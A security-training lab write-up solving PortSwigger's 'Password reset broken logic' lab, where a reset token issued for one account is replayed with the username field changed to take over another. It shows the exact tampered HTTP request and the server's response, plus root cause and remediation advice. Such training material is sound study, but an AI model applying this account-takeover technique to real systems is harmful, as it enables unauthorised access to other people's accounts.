# Lab Report: Password Reset Broken Logic

**Target:** PortSwigger Web Security Academy
**Lab:** [Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
**Category:** Authentication Vulnerabilities → Other Mechanisms
**Difficulty:** Apprentice
**Status:** Solved

---

## Summary

The application's password reset flow issues a token tied to an email/link, but
the server-side handler that actually performs the reset does **not bind that
token to the username supplied in the same request**. An attacker can request
a password reset for their own account, obtain a valid token, and then replay
the reset request with the `username` parameter swapped to a victim's account
while keeping their own valid token. The server accepts the token as "valid
for a reset" without checking it was issued for the username being reset,
allowing full account takeover.

## Vulnerability Classification

- **Type:** Broken Authentication / Password Reset Poisoning (Parameter Tampering)
- **OWASP:** A07:2021 – Identification and Authentication Failures
- **CWE:** CWE-640 (Weak Password Recovery Mechanism), CWE-620 (Unverified Password Change)

## Environment

| Role    | Username | Password (after exploit) |
|---------|----------|---------------------------|
| Attacker | `wiener` | `peter` (initial)          |
| Victim   | `carlos` | `223671` (set by attacker) |

## Steps to Reproduce

1. With Burp Suite's proxy intercepting traffic, open the login page and click
   **Forgot your password?**.
2. Submit the attacker's own username (`wiener`) to trigger a password reset
   email (`POST /forgot-password` with body `username=wiener`).
3. Open the lab's built-in **Email client** and locate the reset link sent to
   `wiener`:
   ```
   GET /forgot-password?temp-forgot-password-token=m270ao18jw8x2ldy5mjf7l06ldjilr1l
   ```
4. Follow the link, start the "set new password" form, and capture the
   resulting request in Burp's Proxy history / Repeater.
5. Send the request to **Repeater** and tamper with the `username` body
   parameter, keeping the attacker's own valid token unchanged. The modified
   request actually sent was:

   ```http
   POST /forgot-password?temp-forgot-password-token=m270ao18jw8x2ldy5mjf7l06ldjilr1l HTTP/2
   Host: 0a0a00d804c5e7fe80b9df3a00150099.web-security-academy.net
   Cookie: session=V09DBAKOC64IiEHKDMCyOYxvPblnlgmk
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 119

   temp-forgot-password-token=m270ao18jw8x2ldy5mjf7l06ldjilr1l&username=carlos&new-password-1=223671&new-password-2=223671
   ```

   Note that `temp-forgot-password-token` still belongs to `wiener`'s reset
   session, but `username` has been changed to `carlos`.

6. The server responded with a successful redirect, confirming the reset was
   accepted for the tampered username:

   ```http
   HTTP/2 302 Found
   Location: /
   X-Frame-Options: SAMEORIGIN
   Content-Length: 0
   ```

7. Logged in as `carlos` / `223671` and loaded **My account**, which
   confirmed account takeover:
   - `Your username is: carlos`
   - `Your email is: carlos@carlos-montoya.net`
   - Lab status banner: **"Congratulations, you solved the lab!"**

### Evidence

- Proxy history entry `#22`: `POST /forgot-password?temp-forgot-password-token=...` → `302` (length 81), confirming the tampered request was accepted by the server.
- Post-exploit `My account` page for `carlos` loaded successfully using credentials known only to the attacker.
- Lab marked **Solved** in the PortSwigger UI.

## Root Cause

The server validates that `temp-forgot-password-token` is *a* currently
outstanding, unexpired reset token, but does not verify that the token was
originally issued **for the `username` included in the same request**. Token
validity and account identity are checked independently rather than as a
single bound unit, so any valid token can be "redirected" to reset any
account by changing one form field.

## Impact

- Full account takeover of any user, without needing access to their email
  or any credentials.
- Attack requires only the ability to trigger a reset for an attacker-owned
  account and knowledge of the victim's username (often easily guessable or
  enumerable).
- Severity: **High** — complete compromise of authentication for arbitrary
  accounts.

## Remediation

1. **Bind the token to the user server-side.** Store the token together with
   the user ID it was issued for, and re-validate that pairing on submission
   — never trust a `username` field supplied by the client for this purpose.
2. **Use the token alone as the sole identifier for the reset session;** do
   not accept a separate, client-controlled `username` parameter in the
   reset-submission request at all.
3. **Make tokens single-use and short-lived**, and invalidate them
   immediately after a successful reset or after a short expiry window.
4. **Use cryptographically strong, high-entropy tokens** and store only a
   hash of the token server-side, to prevent prediction and to limit damage
   from token leakage.
5. **Rate-limit and monitor** password reset requests per account/IP to
   detect abuse.

## Timeline

- Lab accessed: `2026-11-18 09:35`
- Reset request tampered and sent via Burp Repeater: `2026-11-18 09:46`
- Lab confirmed solved (account takeover of `carlos`): `2026-11-18 09:46`

## References

- [PortSwigger: Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
- [CWE-640: Weak Password Recovery Mechanism for Forgotten Password](https://cwe.mitre.org/data/definitions/640.html)
